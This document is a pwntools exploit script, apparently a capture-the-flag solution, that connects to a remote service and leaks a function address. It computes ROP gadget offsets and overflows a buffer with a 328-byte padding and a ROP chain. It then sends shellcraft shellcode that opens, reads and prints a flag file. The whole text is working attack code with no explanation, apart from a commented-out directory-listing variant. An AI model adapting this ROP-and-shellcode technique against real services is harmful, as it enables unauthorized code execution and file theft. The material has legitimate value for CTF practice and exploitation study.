from pwn import *

p = remote("103.145.226.206", 20022)
#p=process("./oriental")
context.log_level = 'debug'
context.arch = 'amd64'

p.sendline(b"2")
p.sendline(b"y")
p.sendline(b"3")
p.recvuntil(b"some ")
leak = (p.recvuntil(b"\n"))
lookAround_func = int(leak.decode().strip(),16)
print(hex(lookAround_func))
underDevelopment_func = lookAround_func - 998
aboveDevelopment_func = lookAround_func - 1309
pop_rdi = lookAround_func - 1496
pop_rsi = lookAround_func - 1505
pop_rdx = lookAround_func - 1523
pop_rcx = lookAround_func - 1514
jmp_rax = lookAround_func - 1788
gadget_ret = lookAround_func - 2213

payload = b"a"*328
payload += p64(gadget_ret)
payload += p64(pop_rdi)
payload += p64(0xDEADD34D)
payload += p64(pop_rsi)
payload += p64(0x1234ABCD)
payload += p64(pop_rdx)
payload += p64(0xCA77D099)
payload += p64(underDevelopment_func)

payload += p64(gadget_ret)
payload += p64(pop_rdi)
payload += p64(0xBEEFBEEF)
payload += p64(pop_rsi)
payload += p64(0xDEADCAFE)
payload += p64(pop_rdx)
payload += p64(0xCAFECAFE)
payload += p64(pop_rcx)
payload += p64(0xDEADBEEF)
payload += p64(aboveDevelopment_func)

def getdents():
  payload = shellcraft.open("./", 0)
  payload += shellcraft.read(3, "rsp", 0x1000)
  payload += shellcraft.getdents64(4, "rsp", 0x1000)
  payload += shellcraft.write(1, "rsp", 0x1000)
  return payload

def flag():
  payload = shellcraft.open("./flag_part_two.txt")
  payload += shellcraft.read("rax", "rsp", 0x100)
  payload += shellcraft.write(1, "rsp", 0x200) 
  return payload

p.sendline(b"1")
p.sendline(b"FOMO")
p.sendline(payload)
print(p.recvuntil(b"here..."))

#p.sendline(asm(getdents()))
p.sendline(asm(flag()))
p.interactive()


